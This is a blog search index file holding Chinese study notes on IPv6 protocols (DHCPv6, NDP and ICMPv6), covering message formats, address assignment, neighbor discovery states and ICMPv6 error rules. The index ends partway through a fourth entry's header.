<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[DHCPv6协议学习]]></title>
    <url>%2F2018%2F10%2F31%2FDHCPv6%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[DHCPv6(Dynamic Host Configuration Protocol for IPv6) 前言前面学到IPv6存在无状态地址配置以及有状态地址配置两种形式，前者多依赖于NDP进行配置，是目前IPv6广泛采用的IPv6地址自动配置方式。但是无状态地址配置方案中路由器并不记录所连接的IPv6主机的具体信息，并且配置方式不能使IPv6主机获取DNS，服务器的IPv6地址等配置信息，在可用性上存在一定缺陷。DHCPv6是一种有状态自动配置协议。在配置过程中，DHCPv6服务器会给主机分配完整的IPv6地址，并且提供DNS服务器地址等配置信息。中间通过DHCPv6中继转发DHCPv6报文，将分配的IPv6与客户端绑定，增强了网络的可管理性。 DHCPv6定义组播地址DHCPv6协议中不用对DHCPv6服务器进行地址配置，而是发送目的地址为组播地址的报文来定位服务器，使用的组播地址有两个： FF02::1:2：所有DHCPv6服务器和中继代理的组播地址，这个地址是链路范围的，用于客户端和相邻服务器及中继代理之间通信。DHCPv6 服务器和中继代理都是该组的成员 FF05::1:3：所有DHCPv6 服务器组播地址，这个地址是站点范围的，用于中继代理和服务器之间的通信，站点内的所有DHCPv6 服 务器都是此组的成员。 UDP端口DHCPv6报文所使用的UDP端口如下： UDP 546端口：客户监听的UDP端口。 UDP 547端口：服务器和中继代理监听的UDP端口。 DHCP唯一标识符DHCP Unique Identifier (DUID)是用来唯一标示每一个DHCPv6用户或服务器。前言已经提及的绑定管理就是依靠于这个定义。它和DHCPv4中的客户和服务器标识符类似。 从DHCPv6报文处理方面来说，DUID是一段不透明的可变长数据。DHCP客户或服务器对于两个DUID的比较只能看他们是否一样。在[RFC3315]定义了DUID的标准格式来确保唯一性。 DUID的开头两个字节与前面的报文一样都是类型字段，后面是基于类型的可变长数据。 DUID-LLT：链路层地址加时间 如上图所示是LLT的格式： 硬件类型：指定硬件设备，依据来源于IANA指定的16位硬件类型。 时间：32位无符号整数，以秒为单位的时间戳。 链路层地址：节点上产生这一DUID的网络设备的链路层地址。具体设备在前面指定。 标识符包含有产生时间，所以DUID-LLT很可能是唯一的，所以一般由具有固定存储器的通用设备（PC机）使用此类DUID，在节点上产生DUID的硬件可以独立于DHCPv6操作。 DUID-EN：基于企业编号的厂商分配的唯一ID 如上图所示是EN的格式： 企业编号：IANA用以表示的一个特定厂商。 标识符：每个厂商特定的可变长数据。 DUID-EN应当由网络设备的制造商来使用，并且应该能标识由那个网络制造商提供的设备。 DUID-LL：链路层地址 硬件类型：与LLT中字段功能相同 链路层地址：节点上产生这一DUID的网络设备的链路层地址。设备类型由前字段确定。 该类型与LLT类似，但不包含时间字段，用于那些有永久链接对的带有链路层地址的网络接口设备，并且此类设备没有存储生产时间的相应设备。 身份关联身份关联(Identity Association IA)是一种概念上的结构，用来标识一系列的DHCPv6配置信息。每一个IA又是有一个32比特的标识符来标识，称之为IAID,IAID与每一个客户内的特定IA是一对一的关系。这点在绑定中也有相应的作用。 一个IPv6中一个接口可以有多个IP地址的特性。IA最初目的是在一个客户定义多个身份，每一个关联一个不同的IPv6地址。租用期由IA进行管理，而不是由地址管理，也就是说，跟新分配的配置信息的DHCPv6交换由IA执行。 每个IA都由两个参数T1和T2控制跟新。IA有以下三种类型： 非临时地址身份关联(identity association for non-temporary address, IA_NA)，定义正常的为客户接口分配的IPv6地址。 临时地址身份关联(identity association for temporary. address, IA_TA)，定义临时的为客户接口分配的IPv6地址。 前缀代理身份关联(identity association for prefix delegation, IA_PD)，定义IPv6前缀，这些前缀由代理路由器分配到请求路由器。 绑定前言提及，为了方便管理，会对IPv6地址与客户或服务器进行绑定。绑定过程由元组&lt;客户的DUID,IA类型，IAID&gt;来确定。 DHCPv6报文前面提及有很多类型报文，DHCP也存在报文，但与不同目标交互报文格式不同。 客户与服务器 如上图所示是客户与服务器之间使用的DHCPv6报文格式： 报文类型：8位整数，标识DHCP报文类型。 事务ID：报文交换的事务ID,一个24位整数。事务ID由交换的发起者（通常为客户）选定。响应端复制ID到响应。当发起者接收到响应时，会与ID匹配来确定对于的交换。 选项：报文所携带的选项，此字段包含DHCPv6服务器分配给IPv6主机的配置信息。 中继代理与服务器 如上图所示是中继代理和服务器之间使用的DHCPv6报文格式： 报文类型：表示类型，只能为12(中继转发)或13(中继应答)。 跳数：这个字段只有在中继转发报文中有效，表示报文中继代理个数，避免报文进入无限循环。 链路地址：一个全球地址，服务器用这个地址表示客户所在链路。 对等地址：客户或中继代理的地址，通过此类地址接受将要中继的报文。这个地址在中继转发报文中设置，并在中继应答报文中使用，使得应答报文能转回客户。 选项：该字段包含特定于中继代理操作的DHCPv6选项。必须始终包含中继报文选项。 DHCP报文类型 类 型 名 称 描 述 1 寻求(solicit) 客户发出，寻找可用DHCPv6服务器 2 广告(advertise) 服务器发出，携带配置信息以响应寻求报文 3 请求(request) 客户发出，到指定服务器进行资源分配 4 确认(confirm) 当客户转移到不同链路时发出，确认分配地址及前缀是否有效 5 更新(renew) 客户发出到资源分配服务器以跟新资源 6 重新绑定(rebind) 跟新报文失败时，客户发出以跟新分配的信息资源 7 应答(reply) 服务器发出，响应客户各种报文，主要是确认或拒绝客户的请求 8 释放(releasc) 客户发出，通知分配资源了的服务器可以释放资源。 9 拒绝(decline ) 客户发出，告知服务器某分配地址已经在使用。 10 重配置(reconfigure) 服务器发出，发起一个以更新或请求报文开始的交换。促使客户刷新分配的信息 11 信息请求(informationrequecst) 客户发出，用于无状态服务 12 中继转发(relay-forward) 中继代理发出，封装从客户到服务器的报文 13 中继应答(relay-reply) 服务器发出，通过中继封装一个返回到客户的报文。 DHCPv6工作原理有状态自动分配IPv6主机在地址分配之前，由IPv6节点生成链路本地地址并且经过DAD检验之后，首先会有一个链路路由器发现的过程，此时IPv6节点发送RS报文，链路路由器回应以RA报文，之前就已经提及，RA报文中有M，O字段，如果两个字段值都为1，则表示IPv6节点通过有状态DHCPv6进行配置。 DHCPv6服务器进行地址分配以及前缀分配有两种类型：四步交互分配和两步交互分配。 四步交互分配当网络中存在有多个DHCPv6服务器时，常使用四步交互分配： 客户端发送Solicit报文以寻求DHCPv6服务器。 如果Solicit报文没有Rapid Commit选项，或DHCPv6服务器不支持快速分配过程，则服务器回复Advertise报文，通知客户端其存在关系。 客户端如果收到多个Advertise报文，则根据报文中服务器的优先级等参数选择最优服务器，并向所有服务器发送Request报文，其中包含已选择服务器的DUID. DHCPv6服务器回复Reply报文，确认将地址和网络配置参数分配给客户端使用。 两步交互分配当网络中仅存在有一个DHCPv6服务器时，常使用两步交互分配，这种方法可以提高DHCPv6的工作效率，但为了防止多个服务器同时可以分配IPv6地址并回应Reply报文，管理员可配置服务器是否支持两步交互地址分配方式。 客户端发送Solicit报文，并带有Rapid Commit选项，标识客户端希望服务器能够快速为其分配地址和网络配置参数。 DHCPv6服务器接收到报文后进行如下处理： 若支持快速分配地址，则直接返回Reply报文，带有分配给的Ipv6地址以及网络配置参数，当然也带有Rapid Commit选项。 若不支持快速分配，则采用四部交互方式开始进行分配。 无状态自动分配节点接收的RA报文中M,O字段若标识为0和1的话，标识IPv6只通过DHCPv6获取除IPv6地址以外的服务器配置信息。 其工作过程如下： 客户端以组播方式向服务器发送Information-Request报文，该报文中Option Request指定想要获取的配置参数。 服务器接收到报文后，为客户端配置参数，并以单播形式发送Reply报文。 中继工作原理客户端与服务器之间并非直接通信，在他们之间会有一个中继代理对报文进行处理封装，其交互工作过程如下： 客户端向所有服务器以及中继的组播地址FF02::1:2发送请求报文。 中继转发报文有如下两种情况： 1）若中继与客户端处于同一链路上，即DHCPv6中继为DHCPv6客户端的第一跳中继，中继接收到的客户端报文，将其封装到Relay-Forward报文的中继消息选项，发送给服务器。 2）若中继与客户端处于不同链路上，中继接收的报文是来自其它中继的Relay-Forward报文，中继会狗仔一个新的Relay-Forwrad报文并发送给服务器或下一跳中继。 服务器从Relay-Forward报文中解析出客户端的请求，为客户端选择IPv6地址和其他配置参数，构造应答信息，并将应答信息封装到Relay-Reply报文的中继消息选项中发送给中继。 中继解析出服务器的应答，转发给客户端，客户端根据应答报文中服务器优先级选择最优选项对地址及其他网络配置参数进行配置。 IPv6/前缀选择DHCPv6服务器对IPv6地址进行分配是有优先次序的。 选择IPv6地址池，服务器的接口必须绑定有IPv6地址池，所以特定端口下的客户端使用该端口绑定的地址池进行IPv6/前缀选择。 选择IPv6/前缀. 1) 如果地址池中为客户端已指定地址/前缀,优先选择与客户端DUID匹配的地址/前缀。 2）如果客户端报文中的IA选项带有有效地址/前缀，优先进行分配，如果改地址/前缀在地址池中不可用，则另外分配一个空闲地址/前缀给客户端。 3）从地址池选择空闲地址/前缀分配给客户端。 4）没有合适地址/前缀进行分配，则分配失败。 地址租约更新服务器分配给客户端的地址是有租约的，其约定由生命期（包括地址优先生命期和有效生命期）和IA的两个参数，T1，T2，即续租时间点组成。 当客户端地址使用到期，则在T1时刻发送Renew报文给服务器，其中IA选项携带需要续租的IA地址。 如果客户端一直未收到T1续租报文的回应报文，则在T2时刻发送Rebind报文继续续租。 T1时刻 客户端在T1时刻发送Renew报文进行地址续租更新请求。 服务器回应Reply报文两种情况。 a) 若客户端可继续使用，则回应续租Reply报文，表示成功更新租约。 b) 若客户端不可再使用，则报文通知续租失败。 T2时刻 向所有服务器组播发送Rebind报文请求更新租约。 服务器回应Reply报文两种情况。 a) 若客户端可继续使用，则回应续租Reply报文，表示成功更新租约。 b) 若客户端不可再使用，则报文通知续租失败。]]></content>
      <categories>
        <category>protocol</category>
      </categories>
      <tags>
        <tag>IPv6 DHCPv6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IPv6 NDP协议学习]]></title>
    <url>%2F2018%2F10%2F19%2FIPv6-NDP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[邻居发现协议NDP(Neighbour Discover Protocol) 前言众所周知，在IPv4的通信中，地址解析协议ARP(Address Resolution Protocol)起着至关重要的作用，但是也产生了不少的安全问题，利用ARP发起相关的攻击，造成一定的危害。在IPv6中一个新的协议替代了ARP协议，邻居发现协议NDP，它定义了使用ICMPv6报文实现地址解析，邻居不可达检测(NUD)，重复地址检测(DAD)，路由器发现以及重定向等功能。 参考：https://blog.csdn.net/qq_38265137/article/details/80466128https://blog.csdn.net/frank_jb/article/details/49949483?utm_source=blogxgwz0 0x00 新名词信息在ICMPv6学习中我们了解到了四个错误报文，和两个回应报文，并且也提及了，在NDP协议中定义了五个新的报文如下： RS(Router Solicitation，路由请求):ICMPv6类型：Type=133 RA（Router Advertisment，路由器公告）:ICMPv6类型：Type=134 NS（Neighbor Solicitationh，领居请求）:ICMPv6类型：Type=135 NA（Neighbor Advertisement，邻居公告）:ICMPv6类型：Type=136 Redirect（重定向报文）:ICMPv6类型：Type=137 前言中说到了在NDP协议中包含了许多新的知识点，这里总括一下： 地址解析：在IPv6中，地址解析是让两个希望通信的节点间相互确定目的节点的链路本地地址的方法。除了解析功能外，还是用那个NUD来维持邻居节点之间的可达性状态信息。 无状态地址配置：有状态地址配置的时候使用DHCPv6进行分配，而无状态地址配置是NDP中特有的地址自动配置机制，包括路由发现，接口ID自动生成，重复地址检测，无状态地址配置等机制，链路上的节点可以自动获取IPv6全球单播地址。 重定向：直白的说就是找到了一条更好的路径去传输报文，则路由就会通知节点进行相关配置的变更。 以上涉及的一些新名词就是本篇要着重介绍的知识。 0x01 地址解析IPv4中ARP报文直接被封装在以太网报文中，以太网协议的类型是0x0806，普遍认为ARP定位为2.5层的协议。NDP本身基于ICMPv6实现，其所使用的报文都是被封装在ICMPv6报文中，以太网协类型为0x86DD,即IPv6报文，所以一般NDP被看成第三层协议。与链路层协议无关的益处有以下几点： 1. 加强了地址解析协议与二层链路的独立性，在链路层不同的链路层协议都可以使用相同的地址解析协议。 2. 增强了安全性，利用第三层标准的安全认证机制可以防止ARP的相关攻击。 3. 使用了组播方式发送请求报文，减少了二层网路的性能压力。 在地址解析过程中所需要的ICMPv6报文为：NS以及NA，如下图所示分别是NS及NA的报文格式： NS：Type字段值为135，Code字段值为0，在地址解析中作业可类比IPv4的ARP请求报文。校验和字段包含了ICMPv6校验和值，发送端必须将保留字段设置为0，接受段忽略此字段。 目标地址字段包含了请求目标的地址。这个字段一定不能包含多播地址 源链路层地址选项是目前为邻居请求报文定义的唯一一个选项。在多播发送邻居请求报文时，发送端必须包含其链路层地址。如果源地址是不确定地址，则必须忽略此选项。 NA：Type字段值为136，Code字段值为0，在地址解析中作业可类比IPv4的ARP应答报文。校验和字段包含了ICMPv6校验和值，发送端必须将保留字段设置为0，接受段忽略此字段 R：”路由器(Router)标志”，当置1时候，就说明发送者是路由器，R字段由NUD(地址不可达检测)使用，用于检测改变为主机的路由器。 S：”请求(Solicited)标志”，这个标志说明收到邻居广告报文是否是对广告目的地址指定的节点发送的请求报文的响应，但是在带有多播目的地址的邻居广告报文中必须将S标志清楚。 O：”覆盖(Override)标志”:邻居广告报文中设置O字段时，如果缓存了发送端广告报文的链路层地址，接收端就会对这个缓存条目进行跟新。如果缓存的条目不存在，接收端就会创建包含发送端链路层地址的条目。但是不能为任播地址配置O字段。 目标地址字段中包含邻居请求报文目标地址的字段的值。目标链路层地址选项是为邻居广告报文定义的唯一一个选项。发送端在多播发送邻居广告报文时必须包含其链路层地址。接收端必须不认识的和其他认识的选项都忽略掉。 使用网上的一个例子帮助理解一下解析的过程： HostA想要得知HostB的链路层地址，于是向B发送了一个NS报文，相关信息为Type=135 源地址为A的IPv6地址，目的地址为B请求节点组播地址，并在NS报文的Options字段中加入了HostA的链路层地址。 HostBs收到了NS报文后，就回应NA报文，相关信息为Type=136，源地址为B的IPv6地址，目的地址为A的IPv6地址（使用NS报文选项字段的A的链路层地址进行单播），并在NA报文的Options字段中加入了HostB的链路层地址。 A与B之间经过上述的包交互，便可以实现相互通信，这样就完成了一个地址解析的过程。 0x02 邻居不可达检测NUD(Neighbour Unreachable Detection,邻居不可达检测)是一个新的机制。用来保持对邻居可达性状态的检测。邻居缓存表中定义了6种状态： INCOMPLETE(未完成状态):表示对邻居链路层地址的地址解析正在进行中，但邻居链路层地址尚未确定。 REACHABLE(可达状态):表示地址解析成功结束，该邻居可达。 STALE(失效状态):表示可达时间耗尽，未确定邻居是否可达。 DELAY(延迟状态):表示未确定邻居是否可达。此状态的邻居就不再认为是可达的了。 PROBE(探测状态):节点会周期性地向处于PROBE状态的邻居持续发送NS报文。 EMPTY(空闲状态):表示节点上没有相关邻接点的邻居缓存表项。 如上图所示，各状态之间可以实现相互转换： 在EMPTY状态时，如果有报文发送给邻接节点，那么就在本地邻居缓存表建立该邻接节点的表项，邻居的可达性状态变为INCOMPLETE，同时向邻接节点以组播方式发送NS报文。 节点接收到了邻居回应的单播NA报文后，也就意味着地址解析成功，邻居可达性状态变为REACHABLE，否则变为Empty,即为删除表项。 处于REACHABLE状态的表项，如果在默认(30s)时间内未接收到关于该邻居的”可达性证实信息”，则进入STALE状态。另外，如果该节点收到邻居节点发出的非S置位NA报文，并且链路层地址发生变化，也会进入STALE状态。 在处于STALE状态的邻居产生流量时，节点要开始进行可达性探测。节点会将探测分组的传输延时一段时间，以便给高层协议一个提供邻居可达性信息的机会。这段延迟使得邻居的可达性状态转换为DELAY状态。 在DELAY状态下，如果在默认(5s)时间内未收到关于该邻居的”可达性正式信息”，则该表项进入PROBE状态。 在PROBE状态下，发送方每隔一段时间(1s)发送单播NS,发送固定次数(3)次后，若收到应答NA,则状态变为Reachable，否则变为Empty,即为删除表项。 0x03 无状态地址分配开头就已经提及，在IPv6下存在有状态和无状态的配置机制，前者依靠DHCPv6，后者通过NDP,在无状态地址自动配置中，主机通过接受链路上的路由器发出的RA消息，结合接口的标识符而生成一个全球单播地址。 重复地址检测(DAD)Duplicate Address Detect是在某个接口使用IPv6单播地址之前进行的。保证地址的唯一性。尤其是在地址自动配置时显得尤为重要。避免地址重复。 一个IPv6单播地址进行DAD是称之为主机的试验地址。接口在执行DAD时还无法使用这个地址进行通信，但是仍然会加入两个组播组：ALL-NODES组播组和试验地址对用的Solicited-Node组播组。 如上所示就是DAD的大致过程，A的IPv6地址FC00::1是新配置的地址，所以向FC00::1的组播组发送一个请求，由于FC00::1并未正式指定，所以NS报文的src只能是未指定状态。当B接收到NS报文后会给以回复： B的试验地址也包含FC00::1,则B会放弃使用该地址为接口地址，并且不会发送NA报文。 B发现FC00::1是一个正常使用的地址，则会发送NA报文通知A改地址已被使用，A上该试验地址不生效，被标志位duplicated(被复制)状态路由发现 路由发现主要通过以下RA以及RS两种报文进行交互，以下是两种报文的格式： RS(路由请求报文)的类型字段值为133，代码字段值为0，校验和字段包含了ICMPv6校验和值。发送端必须将保留字段设置为0，接收端忽略此字段。 有一个唯一的选项是源链路层地址选项，如果发送端知道他的链路层地址，就会在路由器请求报文中包含带有这条信息的源链路层地址选项。如果源地址是不确定地址则忽略此选项。 同时接收端要忽略那些不认识的和其他认识的选项，在这儿不产生任何错误报文，只会对报文继续进行处理。 RA(路由广告报文)的类型字段值为134，代码字段值为0，校验和字段包含了ICMPv6校验和值。发送端必须将保留字段设置为0，接收端忽略此字段。 当前的跳数限制字段包含的是要放入所有输出分组的IPv6首部的跳数限制字段的默认值。如果值为0则说明路由器没有说明跳数限制的配置。 M字段为”管理的地址配置”标志。M的取值标志着地址配置是否可以使用DHCPv6。 O字段为”其他有状态配置”标志。O的取值标志着是否可以使用DHCPv6的无状态子集来获取不与特定地址相关的配置信息，例如DNS递归名字服务器的IPv6地址。 路由器寿命字段是一个16比特的无符号整数，说明了路由器要当多久的默认路由。这个值是以秒为单位，最大值为18.2小时。值为0说明传输路由器不是默认路由。这种情况下不会把路由器作为向链外目的地发送分组的下一跳候选者。 可达时间字段是一个32比特的无符号整数，说明了下一个节点从与通信的邻居收到可达性证实之后，认为这个邻居在多长时间内是可达的。这个值以毫秒为单位。当可达时间到期，但却没有收到相关可达性证实，节点就开始进行NUD。值为0说明广告路由没有指定这个参数。 重传定时器字段是一个32比特的无符号整数，以毫秒为单位，说明了NUD以及地址解析算法中分组传输的间隔。值为0说明广告路由没有指定这个参数。 一共存在有三个选项：源链路层地址选项，MTU选项以及前缀信息。源链路层地址：路由器可在选项中设置发送接口的链路层地址，这样接受主机在通过路由器发送分组时候就无需执行链路层地址解析了。MTU:通过MTU选项为那些缺乏良好定义的MTU长度的链路提供统一的MTU值。 注：当主机所在的链路中存在多个设备时，需要根据报文的目的地址选择转发设备。在这种情况下设备通过发布默认路由优先级和特定路由信息给主机。 如上图所示，是优化过的RA报文，其中H字段是为了支持IPv6移动性定义的。优先字段为一个2比特的路由器优先字段，说明了默认路由间的优先级情况： 编码 优先级 01 高 00 中 11 低 10 保留 当主机收到上述的RA报文后，会跟新自己的默认路由表，优先选择链路上优先级最高的设备发送报文，如果设备故障，继续根据优先级选择其他设备。但是如果接受到RA报文中显示路由的寿命为0，那么直接忽略优先级。 地址自动配置NDP进行无状态自动配置包含两个阶段：链路本地地址的配置以及全球单播地址的配置。 当一个接口启用时，主机会首先根据本地前缀FE80::/64和EUI-64接口标识符，为该接口生成一个链路本地地址，如果在后续的DAD中发现地址冲突，则必须对接口手动配置本地链路地址，否则接口不能使用。而且，一个链路本地地址的优先时间和有效时间是无限的。 对于主机全球单播地址的配置有如下几步： 主机配置有链路本地地址后，发送RS报文请求发现路由。 路由器接收到RS后发送单播RA,RA中包含有无状态地址配置的前缀信息，同时路由器也会周期性地发送组播RA报文。 主机节点收到RA后，根据前缀信息和配置信息生成一个临时的全球淡泊地址。同时使用DAD发送NS以确保地址唯一性。 链路上其他节点接收DAD的NS报文后若无用户使用改地址则丢弃报文，否则应答NS发送NA报文。 节点没有收到回应报文，则说明地址唯一，则使用该临时地址初始化接口，地址有效化。 地址自动配置完成，路由器可自动进行NUD以周期性发送NS方法确定可达性。 重定向当网关设备发现其他更优网关设备来转发报文，它就会发送重定向保卫通知报文的发送者，让报文发送者选择另一个网关设备。重定向报文也是封装ICMPv6报文中的，其报文格式如下图所示： 重定向报文的类型字段值为137，代码字段值为0，校验和字段包含了ICMPv6校验和值。发送端必须将保留字段设置为0，接收端忽略此字段。 如果有更好的第一跳路由器，或者目的地是一个在链的邻居，路由器就会发送重定向报文。在第一种情况下，目标地址字段中包含了更好的第一跳路由器的链路本地地址:在第二种情况下，目标地址字段的值与目的地址字段的值相同。 目的地址字段中包含了分组最终目的地的地址。 重定向报文有两种可能的选项，这两个选项是目标链路层地址选项和重定向首部选项。目标链路层地址选项中包含了目标地址的链路层地址。重定向首部选项在整个重定向分组不超过最小链路MTU的前提下，包含了尽可能多的触发重定向的那个原始IPv6分组。 如上图所示例子，HostA想与HostB通信，A的默认网关设备为RouterA,当HostA将报文发送给HostB时会被送到RouterA,RouterA接受到报文经过检测后会发现，HostA将报文直接发送给RouterB会更好，于是便发送重定位报文，报文的中指定更好的下一跳地址为RouterB,目标地址为HostB。HostA接收到重定向报文后会在路由表中加上RouterB为主机路由，发送给HostB的报文就直接发送给RouterB而不再经过RouterA。 注：只有如下情况，设备会向报文发送者发送重定向报文： 报文目的地址不是一个组播地址。 报文并非通过路由转发给设备 经过路由计算后，路由的下一跳接口是接受报文的接口。 设备发现报文的最佳下一跳IP地址和报文的源IP地址处于同一网段。 设备检查报文的源地址，发现自身的邻居表项中有用该地址作为全球单播地址或链路本地地址的邻居存在。]]></content>
      <categories>
        <category>protocol</category>
      </categories>
      <tags>
        <tag>IPv6 NDP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ICMPv6学习]]></title>
    <url>%2F2018%2F10%2F17%2FICMPv6%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[ICMPv6（Internet Control Message Protocol for IPv6） 前言IPv6使用的ICMPv6与IPv4使用的ICMPv4类似。定义了基本的ICMPv6的报文。用于错误报告和网络诊断。 与IPv4的ICMP不同的是，ICMPv6提供了很多IPv6协议操作必须的重要函数。例如IPv6一个重要的协议，邻居发现协议就是在ICMPv6上运行的，它执行了大量的功能，比如自动地址配置和链路层地址解析。因此任何支持IPv6的节点都必须完全实现ICMPv6。 与其他高层协议不同，IPv4与6的ICMP完全不同，TCP与UDP的分租格式及算法都是一样的，通过地址翻译机制可使得IPv4与IPv6的通信，但是两者ICMP提供相互操作确实很难的。 本篇将通篇对ICMPv6的基础学习进行记录。 ICMPv6报文[RFC2463]定义了四种错误报文和两种信息报文。在分组处理过程中遇到问题时，就可以向源端提供报文，而信息报文则提供一些诊断功能。 4种错误报文是： 目标不可达（Destination Unreachable） 分组太长（Packet Too Big） 超时（Time Exceeded） 参数问题（Parameter Problem） 2种信息报文是: 回送请求（Echo Request） 回送应答（Echo Reply） 除了这些之外，还有一些其他的规范，例如邻居发现，节点信息查询，多播监听发现和移动IPv6都定义了一些额外的ICMPv6报文。后面在邻居发现分组都是装载在ICMPv6报文中的。[RFC2461]为ND协议定义了5个这样的ICMPv6报文。 如上图所示，就是通用的ICMPv6的报文格式。IPv6的各种拓展首部都可以放在ICMPv6首部之前。ICMPv6报文中包含以下信息： 类型：8比特的类型字段定义ICMPv6的报文类型，可以将ICMPv6报文划分为错误报文或者信息报文。类型0~127用于错误报文，类型128~255用于信息报文。 代码：8比特代码字段的值取决于报文类型，传送了更多与特定报文有关的信息。 校验和：校验和字段装载了伪首部加上整个ICMPv6报文的反码和的16比特反码。 报文主体的长度和内容取决于报文类型。由于ICMPv6首部不包含长度字段，所以ICMPv6报文的长度是从整个分组长度（通常就是IPv6首部的长度字段值）和拓展首部的长度推导出来的。 目的不可达报文目标不可达报文可能由三个节点产生：分组的源节点、通往分组目的地路径上的中间节点、目的地节点。产生报文即可反映无法传送到分组的各种原因。目的不可达报文格式如下图所示: 目标不可达报文的类型字段值为1，代码字段可取值为0~4，表示意义如下所示： 发送方将未用字段设定为0，接收方会将其忽略。在不超过最小IPv6MTU(最大传输单元 Maximum Transmission Unit)，报文主题包含了尽可能多的原始分组，存储足够 多的原始分组字节就使得源节点的高层协议能识别出引发ICMPv6错误报文的分组所属的流。 即使某些中间链路由于ICMPv6错误报文太长而将其丢弃了，ICMPv6的错误报文也不会重发，这样就可能错过避免错误的恰当时机，因此限制原始分组的最大长度是很有必要的。即使相应节点知道错误报文目的地的路径MTU长度，但是分片本身也存在缺点，所以也应当避免对分组进行分片。有的原始分组中可能包含一些扩展首部，标识流所必需的分组长度可能很长，所以，又希望尽可能多地存储原始分组。 需要注意的是，IPv4的错误报文存储的内容除了原始分组的IP首部外，只包含净荷的前八个字节，这是因为IPv4中没有可以任意长的扩展首部，这样也就足够了。 当节点的ICMPv6层收到一个目的不可达错误报文的时候，必须通知高层的进程。以采取行动及时避免错误。比如当一个有多台候选服务器的UDP客户应用程序收到端口不可达错误的通知后可即使跟换服务器使用而不是等待超时。 分组太长报文当中间节点由于输出链路的MTU小于分组长度而无法转发分组时，就会生成分组太长报文。PMTU(Path MTU)发现记住利用分组太长报文来确定两个端点之间所有路由段的最小链路MTU。这种机制可以帮助传输节点选择正确的分组长度，使得分组可以达到目的地而不会被丢弃。 上图所示就是分组太长报文，其类型字段值为2，代码字段值为0。MTU字段存储了下一跳链路的MTU值，与目标不可达报文一样，在不超过最小IPv6 MTU情况下，报文主体中包含了尽可能多的原始分组。 然后，源节点会按照通知的MTU长度对分组进行分片。节点上的ICMPv6层收到一条分组太长报文时，必须通知高层的进程。这样，高层协议就可以调整TCP片长度以避免分片，从而优化行为。 注：因为需要通过ICMPv6目的不可达报文来通知PMTU发现机制分组超长，所以建议不要在路由器或者防火墙中滤掉这样的ICMPv6错误报文。以免停止PMTU发现机制的工作，这样有事就会造成通信的中断。 超时报文中间路由在响应一个跳数限制字段值为0或者该路由器对跳数限制技术进行了减量操作之后跳数限制变为0的分组时，就生成超时报文。同样的，在超出分组重装时间后也会如此。 上图就是超时报文的格式，报文类型字段为3，代码字段取值为0-1，细节见上。发送方将未用字段设置为0，接收方将其忽略，在不超过最小IPv6MTU情况下，报文主体中包含尽可能多的原始分组，以便为源节点提供线索来确定出错分组。 参数问题报文节点处理一个分组且在分组首部遇到一个问题的时候，会丢弃分组，并生成一调参数问题报文。 如上图所示就是参数问题报文(类型值为4)以及代码取值细节（取值0-2）指针字段是原始分组中遇到错误的位置的字节偏移量，这个错误随后触发了ICMPv6错误报文。如果由于MTU限制进行了截尾操作，使得错误不在报文主题，则偏移量会执行越过ICMPv6分组末尾的位置。 报文主体中包含尽可能多的原始分组，以便为源节点提供线索来确定出错分组。 回送请求报文节点生成回送请求报文主要是为了进行诊断，比如确定一个感兴趣节点的可达性以及往返时延。 上图就是回送请求报文格式，类型字段位128，源节点生成了标识符和序列号字段的值。这些值可以帮助源节点将回送请求报文和返回的回送应答报文对应起来。数据字段中包含零个或者这多个任意内容的字节。 回送应答报文每个IPv6接受到一条请求报文时都必须响应，并产生一条回送应答报文。 如上所示即是回送应答报文格式。类型值为129，代码值为0，标识符和序列号字段以及下面的数据字段都是从接受到的回送请求报文中获得。 注：与错误报文不同，回送应答1分组可以大于最小MTU长度。因为一些“ping”实现会发送回送请求报文应接受回送应答报文，对数据字段进行“完整性”检测，所以，对数据字段进行截尾是不合适的。 ICMPv6报文处理规则产生ICMPv6报文的节点根据下列规则来设置得到的IPv6分组的源地址。 如果ICMPv6报文是为了响应一个共目的地是分配给这个节点的单播地址的分组而产生的，就将那个单播地址作为输出ICMPv6报文的源地址。 如果ICMPv6报文是 为了响应一个其目的地址是一个多播组地址、 任播地址或者未分配给这个节点的单播地址的分组而产生的，那么，ICMPv6的源地址就必须是分配给这个节点的单播地址之一。 应该根据源地址选择规则来选择地址。但当所做的选择能为接收报文的节点提供更多信息时，该节点也可以使用其他地址。 除了回送请求报文之外，前面几节讨论的所有其他类型的ICMPv6报文的目的地都是发起ICMPv6报文的分组的源地址。回送请求报文的目的地可以是任意一个有效的IPv6地址。 ICMPv6实现在处理或生成ICMPv6分组时，必须注意下列规则。 如果ICMPv6层收到了一条未知类型的错误报文或信息报文，必须将分组传送给高层。节点收到一条ICMPv6错误报文或重定向报文时，一定不能生 成ICMPv6错误报文。这条规则可以防止在两个节点间形成ICMPv6错误风暴。 如果原始分组的目的是一一个 多播地址或者分组带有链路层多播或广播地址，节点一定不能产生ICMPv6错误报文。例外的情况是:节点可以生成一条分组太长报文，以及说明逐跳选项或目的选项错误的代码2参数问题报文。即使原始分组的目的是一个多播地址，也可以生成一条分组太 长报文，为多播信道上的PMTU发现提供方便。 如果原始分组的源地址不能唯一地标识一个节点，节点一定不能生成ICMPv6错误报文。这类源地址包括不确定地址，或发送错误报文的节点已知为任播地址的地址。 节点必须限制ICMPv6错误报文的产生速度，以缓和错误报文风暴，比如，当一个远程故障节点不停地发送错误的报文，并忽略ICMPv6错误报文时， 就可能出现这种错误报文风暴。推荐的限速方法是基于令牌桶模型(token bucket model)的，这个模型限制了生成的错误报文的平均数，但仍然允许短期内错误报文的爆发。]]></content>
      <categories>
        <category>protocol</category>
      </categories>
      <tags>
        <tag>IPv6 ICMPv6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IPv6基础探析-II]]></title>
    <url>%2F2018%2F10%2F11%2FIPv6%E5%9F%BA%E7%A1%80%E6%8E%A2%E6%9E%90-II%2F</url>
